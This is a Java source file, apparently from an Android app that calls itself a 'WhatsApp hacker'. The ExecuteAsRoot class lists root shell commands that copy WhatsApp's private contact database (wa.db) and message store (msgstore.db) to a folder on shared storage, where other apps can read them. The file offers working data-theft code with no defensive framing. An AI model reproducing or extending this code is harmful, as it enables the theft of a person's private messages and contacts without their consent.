package com.electricdroid.whatsapphacker;

import java.util.ArrayList;

/**
 * Created by anki on 30-05-2015.
 */
public class ExecuteAsRoot extends ExecuteAsRootBase {
    private String username;
      ExecuteAsRoot(String username){
        this.username = username;
       }
    protected ArrayList<String> getCommandsToExecute() {
        ArrayList<String> anki = new ArrayList<String>();
        anki.add("cd /sdcard");
        anki.add("mkdir tmp");
        anki.add("cd /data/data/com.whatsapp/databases");
        anki.add("cat wa.db > /sdcard/tmp/wa-" + username + ".db");
        anki.add("cat msgstore.db > /sdcard/tmp/msgstore-"+username+".db");
        return anki;
    }
}
